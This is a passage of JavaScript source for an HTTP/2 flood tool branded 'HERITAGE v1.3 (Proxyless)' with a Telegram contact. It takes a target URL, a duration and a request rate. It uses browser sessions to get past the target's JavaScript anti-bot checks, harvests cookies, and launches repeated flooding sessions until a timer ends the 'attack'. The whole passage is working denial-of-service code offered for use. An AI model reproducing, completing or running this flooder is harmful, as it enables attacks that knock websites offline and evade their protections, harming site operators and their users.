...
log(`[info] ` + `HERITAGE v1.3 (Proxyless) - t.me/KaponeBoss`.brightCyan);
log(`[info] ` + `NEKILLNET`.brightCyan);


const target = argv["url"];
const time = argv["time"];
const count = argv["sess"] ? argv["sess"] : 3;
const rate = argv["rate"] ? argv["rate"] : 64;
const precheck = argv["precheck"] ? argv["precheck"] : false;

const parsed = url.parse(target);

log(`[info] ` + `Target: ${target}`.cyan);
log(`[info] ` + `Time: ${time}`.cyan);
log(`[info] ` + `PreCheck: ${precheck}`.cyan);
log(`[info] ` + `random user-agent: True`.cyan);
log(`[info] ` + `flooder type: HTTP/2.0`.cyan);
...
function setFlooder(ip, cookie, ua) {
	...
	startflood(target, ip, cookie, ua);

	log(`Session `.cyan + `HTTP/1 `.green + `Flooder started`.yellow);
}
...
async function createSession() {
	...
	createBrowser({
		...
		precheck: precheck,
		ua: ua
	}).then((cookie, unusable) => {

		log(`[info]` + ` JS Bypassed with Cookies: ${cookie} | UA: ${ua}`.brightCyan);

		setFlooder(undefined, cookie, ua);

		createSession();

	}).catch((Err) => {

		log(`[error]` + ` Unable to bypass !`.red);
		// restaring session
		setTimeout(() => {
			createSession();
		}, 100);
...
setTimeout(() => {
	console.log('Attack has been stoped');
	process.exit(1);
}, time * 1000);